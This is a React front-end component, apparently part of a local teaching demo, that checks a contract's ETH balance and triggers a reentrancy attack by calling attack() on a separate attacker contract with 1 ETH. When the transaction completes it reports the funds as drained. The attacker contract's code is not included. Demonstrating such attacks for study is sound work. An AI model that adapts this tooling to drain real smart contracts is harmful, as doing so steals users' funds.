import { ethers } from "ethers";
import { useState } from "react";

const vulnerableAddress = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
const attackAddress = "0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0";

const attackerABI = [
  "function attack() payable",
];

function Reentrancy() {
  const [balance, setBalance] = useState("");
  const [status, setStatus] = useState("");

  const getBalance = async () => {
    const provider = new ethers.BrowserProvider(window.ethereum);
    const bal = await provider.getBalance(vulnerableAddress);
    setBalance(ethers.formatEther(bal));
  };

  const runAttack = async () => {
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();

    const attacker = new ethers.Contract(
      attackAddress,
      attackerABI,
      signer
    );

    setStatus("⏳ Attack running...");

    const tx = await attacker.attack({
      value: ethers.parseEther("1"),
    });

    await tx.wait();

    setStatus("💀 Attack successful! Funds drained.");
    console.log("Vulnerable Address:", vulnerableAddress);
    console.log("Attacker Address:", attackAddress);
  };

  return (
    <div>
      <h2>🔥 Reentrancy Attack Demo</h2>

      <button onClick={getBalance}>Check Balance</button>

      <p>
        Contract Balance:{" "}
        <strong style={{ color: balance === "0.0" ? "red" : "green" }}>
          {balance} ETH
        </strong>
      </p>

      <button onClick={runAttack}>Run Attack</button>

      <p>{status}</p>
    </div>
  );
}

export default Reentrancy;